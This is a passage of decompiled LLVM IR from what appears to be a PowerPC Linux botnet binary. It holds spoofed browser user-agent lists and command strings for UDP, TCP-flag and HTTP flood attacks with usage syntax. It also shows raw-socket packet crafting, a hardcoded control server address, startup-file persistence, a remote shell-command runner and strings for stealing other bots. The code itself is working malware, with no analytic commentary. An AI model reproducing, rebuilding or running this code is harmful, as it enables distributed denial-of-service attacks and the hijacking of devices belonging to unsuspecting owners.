i32 0)]
@global_var_10004ac0.414 = constant i32 1207986921
@global_var_10004b40.415 = constant [3 x i8] c"8`\00"
@global_var_10004b68.416 = constant [3 x i8] c"8`\00"
@global_var_10004b70.417 = constant i32 939524096
@global_var_1000fdf8.418 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1000fe38.419 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1000fe7c.420 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1000fec0.421 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1000ff04.422 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1000ff48.423 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1000ff8c.424 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1000ffd0.425 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_10010040.426 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_100100b4.427 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_10010100.428 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_10010188.429 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_100101d4.430 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_10010244.431 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_100102b4.432 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_10010328.433 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_100103a0.434 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_100103e8.435 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_10010418.436 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_10010458.437 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_100104a4.438 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1001051c.439 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1001058c.440 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_100105fc.441 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_10010670.442 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_10010704.443 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1001074c.444 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_10010794.445 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_100107d4.446 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_10010850.447 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_100108b8.448 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_10010934.449 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_10010984.450 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_100109d8.451 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_10010a2c.452 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_10010a80.453 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_10024024.454 = global [36 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1000fdf8.418, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_1000fe38.419, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fe7c.420, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fec0.421, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000ff04.422, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000ff48.423, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000ff8c.424, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1000ffd0.425, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10010040.426, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100100b4.427, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_10010100.428, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10010188.429, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_100101d4.430, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10010244.431, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100102b4.432, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_10010328.433, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_100103a0.434, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_100103e8.435, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10010418.436, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10010458.437, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_100104a4.438, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_1001051c.439, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1001058c.440, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100105fc.441, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_10010670.442, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_10010704.443, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1001074c.444, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10010794.445, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_100107d4.446, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_10010850.447, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_100108b8.448, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10010934.449, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10010984.450, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_100109d8.451, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10010a2c.452, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10010a80.453, i32 0, i32 0)]
@global_var_10011f7c.455 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_10004c58.456 = constant i32 1207971249
@global_var_10004cd4.457 = constant [3 x i8] c"8`\00"
@global_var_10011fbc.458 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_10004e2c.459 = constant i32 1207960928
@global_var_10004e80.460 = constant [3 x i8] c"8`\00"
@global_var_10004f4c.461 = constant [3 x i8] c"9 \00"
@global_var_10004fb0.462 = constant i32 1207960524
@global_var_10011fd8.463 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_10005000.464 = constant i32 1207960444
@global_var_10005034.465 = constant i32 1207985525
@global_var_10005360.466 = constant [3 x i8] c"9 \00"
@global_var_100054a8.467 = constant i32 1207960876
@global_var_100054f8.468 = constant i32 1207960796
@global_var_10011ffc.469 = constant [4 x i8] c"all\00"
@global_var_10012000.470 = constant i32 738197504
@global_var_10012004.471 = constant [4 x i8] c"syn\00"
@global_var_10012008.472 = constant [4 x i8] c"rst\00"
@global_var_1001200c.473 = constant [4 x i8] c"fin\00"
@global_var_10012010.474 = constant [4 x i8] c"ack\00"
@global_var_10012014.475 = constant [4 x i8] c"psh\00"
@global_var_10012018.476 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_100057c8.477 = constant [3 x i8] c"8`\00"
@global_var_1001202c.478 = constant [6 x i8] c"PONG!\00"
@global_var_10005a70.479 = constant i32 1207962616
@global_var_10012034.480 = constant [6 x i8] c"PUSSY\00"
@global_var_1001203c.481 = constant [4 x i8] c"OFF\00"
@global_var_10024a58.482 = local_unnamed_addr global i32 0
@global_var_10012040.483 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_10012050.484 = constant [3 x i8] c"ON\00"
@global_var_10005b98.485 = constant [3 x i8] c"8`\00"
@global_var_10012054.486 = constant [5 x i8] c"HTTP\00"
@global_var_1001205c.487 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_10005d30.488 = constant [3 x i8] c"8`\00"
@global_var_10012084.489 = constant [4 x i8] c"UDP\00"
@global_var_10012088.490 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_10005eac.491 = constant i32 1207961532
@global_var_10006054.492 = constant [3 x i8] c"8`\00"
@global_var_1000605c.493 = constant [3 x i8] c"8`\00"
@global_var_100060b8.494 = constant [3 x i8] c"8`\00"
@global_var_100120fc.495 = constant [4 x i8] c"TCP\00"
@global_var_10012100.496 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_100061f0.497 = constant i32 1207960696
@global_var_10006344.498 = constant [3 x i8] c"8`\00"
@global_var_1000634c.499 = constant [3 x i8] c"8`\00"
@global_var_100063a4.500 = constant [3 x i8] c"8`\00"
@global_var_100121bc.501 = constant [4 x i8] c"STD\00"
@global_var_100121c0.502 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_10006438.503 = constant i32 1207960112
@global_var_100064e0.504 = constant [3 x i8] c"8`\00"
@global_var_100064e8.505 = constant [3 x i8] c"8`\00"
@global_var_10006530.506 = constant [3 x i8] c"8`\00"
@global_var_100121dc.507 = constant [5 x i8] c"STOP\00"
@global_var_100249e8.508 = local_unnamed_addr global i32 -1
@global_var_10010ad4.509 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_100249e0.510 = global [20 x i8]* @global_var_10010ad4.509
@global_var_1000674c.511 = constant i32 939524219
@global_var_100121e4.512 = constant [8 x i8] c"8.8.8.8\00"
@global_var_100121ec.513 = constant [16 x i8] c"/proc/net/route\00"
@global_var_100121fc.514 = constant [11 x i8] c"\0900000000\09\00"
@global_var_10006a50.515 = constant i32 939524096
@global_var_10024a38.516 = global i32 0
@global_var_10006aa4.517 = constant i32 1207959564
@global_var_10012208.518 = constant [8 x i8] c"POWERPC\00"
@global_var_10012210.519 = constant i32 0
@global_var_10006b88.520 = constant [3 x i8] c"8`\00"
@global_var_10006ba8.521 = constant [3 x i8] c"8`\00"
@global_var_10006bc8.522 = constant i32 939524096
@global_var_10012214.523 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1912602624
@global_var_1001222c.525 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1001223c.526 = constant i32 788529152
@global_var_10012240.527 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_10006ce4.528 = constant i32 1207959620
@global_var_10012248.529 = constant i32 1627389952
@global_var_10006d8c.530 = constant i32 1207959576
@global_var_10006d98.531 = constant i32 1207959564
@global_var_10006da8.532 = constant i32 1207962721
@global_var_10006dd4.533 = constant [3 x i8] c"8`\00"
@global_var_1001224c.534 = constant [13 x i8] c"fork failed\0A\00"
@global_var_10006e28.535 = constant i32 1207959576
@global_var_10006e40.536 = constant i32 1207963621
@global_var_10006e50.537 = constant [3 x i8] c"8`\00"
@global_var_10006e5c.538 = constant i32 1207959556
@global_var_1001225c.539 = constant i32 458961211
@global_var_10006ec4.540 = constant i32 939524096
@global_var_100122c4.541 = constant [5 x i8] c"PONG\00"
@global_var_10007208.542 = constant i32 1207960788
@global_var_100122cc.543 = constant [9 x i8] c"LELIMDUP\00"
@global_var_100122d8.544 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_100122ec.545 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_100122f8.546 = constant [8 x i8] c"%s 2>&1\00"
@global_var_10012300.547 = constant [3 x i8] c"%s\00"
@global_var_10007520.548 = constant [3 x i8] c"8`\00"
@global_var_10007550.549 = constant [3 x i8] c"8`\00"
@global_var_10007558.550 = constant i32 939524097
@global_var_10012304.551 = constant i32 536870912
@global_var_10007794.552 = constant i32 1207959564
@global_var_10007b30.553 = constant i32 1207959560
@global_var_10024a78.554 = local_unnamed_addr global i32 0
@global_var_10007ea0.555 = constant i32 939524118
@global_var_100249f0 = external local_unnamed_addr global i32
@global_var_10024a88.561 = global i32 0
@global_var_1000c114.562 = constant [3 x i8] c"8`\00"
@global_var_100246cc.563 = global i32 0
@global_var_10024a60.564 = local_unnamed_addr global i32 0
@global_var_10024a64.565 = local_unnamed_addr global i32 0
@global_var_100080f0.566 = constant i32 1207965629
@global_var_100082d8.567 = constant i32 1207960120
@global_var_10024a14.568 = local_unnamed_addr global i32 2
@global_var_100246b4.569 = global i32 0
@global_var_10024a10.570 = global i32* bitcast (i16* @global_var_100246e4.558 to i32*)
@global_var_1000850c.571 = constant i32 1207959560
@global_var_1000855c.572 = constant [3 x i8] c" c\00"
@global_var_10008578.573 = constant [3 x i8] c" c\00"
@global_var_10012908.574 = constant i32 0
@global_var_10008814.575 = constant i32 1207961092
@global_var_10008940.576 = constant i32 1207960768
@global_var_1001293c.577 = constant i32 269488136
@global_var_10012920.578 = constant [6 x i8] c"(nil)\00"
@global_var_10012928.579 = constant [7 x i8] c"(null)\00"
@global_var_10012930.580 = constant i32 721431808
@global_var_10008d9c.581 = constant i32 939524096
@global_var_100129bc.582 = constant i32 65793
@global_var_100129a4.583 = constant i32 524293
@global_var_1001299c.584 = constant [8 x i8] c" +0-#'I\00"
@global_var_10012944.585 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10012984.586 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_10012978.587 = constant i32 67343
@global_var_10012977.588 = constant i32 50331911
@global_var_10012968.589 = constant i32 268435461
@global_var_10012958.590 = constant i32 520093701
@global_var_10009758.591 = constant [3 x i8] c"8a\00"
@global_var_10009a80.592 = constant i32 1207959708
@global_var_10009b28.593 = constant i32 1207959612
@global_var_10009c74.594 = constant i32 939589631
@global_var_10009d28.595 = constant i32 939524118
@global_var_100129d8.596 = constant [8 x i8] c"Success\00"
@global_var_100129c8.597 = constant [15 x i8] c"Unknown error \00"
@global_var_10013666.598 = constant i32 1
@global_var_10024a24.599 = local_unnamed_addr global i32* @global_var_10013666.598
@global_var_10024a68.600 = global i32 0
@global_var_1002aac8.601 = global i32 0
@global_var_1002aca4.602 = global i32 0
@global_var_1002aad8.603 = global i32 0
@global_var_100249b0.604 = global i32 0
@global_var_10024a94.605 = local_unnamed_addr global i32 0
@global_var_1002ad90.606 = global i32 0
@global_var_1000aa94.607 = constant [3 x i8] c"8`\00"
@global_var_1000ab78.608 = constant i32 939524098
@global_var_1000abb8.609 = constant [3 x i8] c"8`\00"
@global_var_1000adc0.610 = constant i32 939524118
@global_var_1000ae48.611 = constant i32 939524118
@global_var_1002ace8.612 = global i32 0
@global_var_1002acb8.613 = global i32 0
@global_var_10024a18 = external global i32
@global_var_1002ad68.616 = global i32 0
@global_var_1000b0a4.617 = constant i32 939524108
@global_var_1000b13c.618 = constant [3 x i8] c"8`\00"
@global_var_1000b1e8.619 = constant [3 x i8] c"8`\00"
@global_var_1000b510.620 = constant i32 1207959640
@global_var_1000b54c.621 = constant i32 1207959580
@global_var_100248e0.622 = global i32 0
@global_var_100248f8 = external global i32
@global_var_10024918.624 = global i32 -1726662223
@global_var_10024900.625 = local_unnamed_addr global i32* @global_var_10024918.624
@global_var_100248fc.626 = global i32* @global_var_10024918.624
@global_var_10013534.627 = constant i32 0
@global_var_1000b864.628 = constant i32 939524118
@global_var_1000bc78.629 = constant i32 939524130
@global_var_10024994.630 = global i32 0
@global_var_10024a6c.631 = local_unnamed_addr global i32 0
@global_var_1000bd0c.632 = constant i32 1207960437
@global_var_10024a74.633 = local_unnamed_addr global i32 0
@global_var_10024000.634 = global i32 -1
@global_var_10024a7c.635 = local_unnamed_addr global i32 0
@global_var_10024a80.636 = local_unnamed_addr global i32 0
@global_var_1001355c.637 = constant [10 x i8] c"/dev/null\00"
@global_var_10024a84.638 = local_unnamed_addr global i32 0
@global_var_10024a70.639 = local_unnamed_addr global i32 0
@global_var_1000c42c.640 = constant i32 939524096
@global_var_1000c448.641 = constant i32 939524096
@global_var_10024aa8.642 = local_unnamed_addr global i32 0
@global_var_10024a8c.643 = global i32 0
@global_var_1000c804.644 = constant i32 939524180
@global_var_1000cb20.645 = constant i32 939524105
@global_var_10013890.646 = constant [4 x i8] c"inf\00"
@global_var_10013893.648 = constant i32 4804166
@global_var_100138a0.649 = constant i32 771763200
@global_var_1002acd0.651 = global i32 0
@global_var_10024a90.652 = local_unnamed_addr global i32 0
@global_var_1000dad4.654 = constant i32 1207960848
@global_var_10024a98.655 = local_unnamed_addr global i32 0
@global_var_100138f0.656 = constant i32 771751936
@global_var_1002ad80.657 = global i32 0
@global_var_1000dbc4.658 = constant [3 x i8] c"8a\00"
@global_var_1000dbd0.659 = constant i32 939524097
@global_var_1000dca4.660 = constant i32 939524097
@global_var_1000dd78.661 = constant i32 939524097
@global_var_1000dda4.662 = constant i32 939524100
@global_var_1000de84.663 = constant i32 1207959684
@global_var_1000e000.664 = constant i32 939589631
@global_var_1001390c.665 = constant i32 1912602624
@global_var_100138f8.666 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_10013910.667 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_10013928.668 = constant [11 x i8] c"nameserver\00"
@global_var_10013934.669 = constant [7 x i8] c"domain\00"
@global_var_1001393c.670 = constant [7 x i8] c"search\00"
@global_var_1000e338.671 = constant i32 1207959568
@global_var_1000e340.672 = constant i32 939524099
@global_var_100249c8.673 = global i32 0
@global_var_1000e4a0.674 = constant i32 939524129
@global_var_10024a9c.675 = local_unnamed_addr global i32 0
@global_var_1000e514.676 = constant [3 x i8] c"8`\00"
@global_var_1000e54c.677 = constant i32 939524129
@global_var_10024aa0.678 = local_unnamed_addr global i32 0
@global_var_10024aa4.679 = local_unnamed_addr global i32 0
@global_var_1000e928.680 = constant i32 939524171
@global_var_1000e9d8.681 = constant i32 939524105
@global_var_1000ed74.682 = constant [3 x i8] c"8`\00"
@global_var_10013958.683 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000ef6c.684 = constant [3 x i8] c"9 \00"
@global_var_1000ef78.685 = constant i32 939524193
@global_var_1000efe0.687 = constant i32 939524101
@global_var_1000f0cc.688 = constant i32 939524124
@global_var_1000f144.689 = constant i32 1207960116
@global_var_1000f15c.690 = constant i32 939524105
@global_var_1000f2d4.691 = constant [3 x i8] c"9 \00"
@global_var_1001396c.692 = constant [3 x i8] c"%x\00"
@global_var_1000f360.693 = constant i32 939524124
@global_var_1000f384.694 = constant i32 939524193
@global_var_10013970.695 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001397c.696 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000fa70.697 = constant i32 1207959560
@global_var_1000fb08.698 = constant i32 939589631
@global_var_10024004.699 = global i32 0
@global_var_10024aac.2 = local_unnamed_addr global i8 0
@global_var_10024a48.49 = local_unnamed_addr global i8 0
@global_var_10024a49.50 = local_unnamed_addr global i8 0
@global_var_10024a4a.51 = local_unnamed_addr global i8 0
@global_var_10024a4b.52 = local_unnamed_addr global i8 0
@global_var_100246e4.558 = global i16 288
@global_var_10024734.559 = local_unnamed_addr global i16 272
@global_var_100249ac.653 = local_unnamed_addr global i16 1
@global_var_10012228.524 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_10024aac.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002401c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002401c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002401c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_10024aac.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_10024aac.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_10024010.9, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_10024010.9 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268462836, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -556), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10024ac8.10, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_10024acc.11, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_10024ad0.12, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10024ac8.10 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10024ac8.10 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_10024ac8.10 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
